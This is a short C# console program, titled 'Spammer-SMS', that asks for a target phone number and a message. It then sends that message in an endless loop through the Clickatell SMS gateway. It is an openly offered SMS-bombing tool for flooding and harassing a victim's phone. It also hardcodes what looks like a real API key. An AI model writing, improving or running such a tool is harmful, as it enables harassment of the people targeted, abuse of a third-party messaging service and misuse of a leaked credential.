using System;
using System.Net;

namespace spammer_sms_by.LIl_เพลี่ยงพล้ำ
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient web = new WebClient();
            Console.Title = "Spammer-SMS By.Lil เหลี่ยงหล้ำ";
            Console.Write("Phone = ");
            string phone = Console.ReadLine();
            Console.Write("Message = ");
            string msg = Console.ReadLine();
            int i = 0;
            while(i <= 99999999999)
            {
                web.DownloadString($"https://platform.clickatell.com/messages/http/send?apiKey=bddu4b_4RC6yKrGrA8AfKw==&to={phone}&content={msg}" + DateTime.Now);
            }
            Console.Read();
        }
    }
}
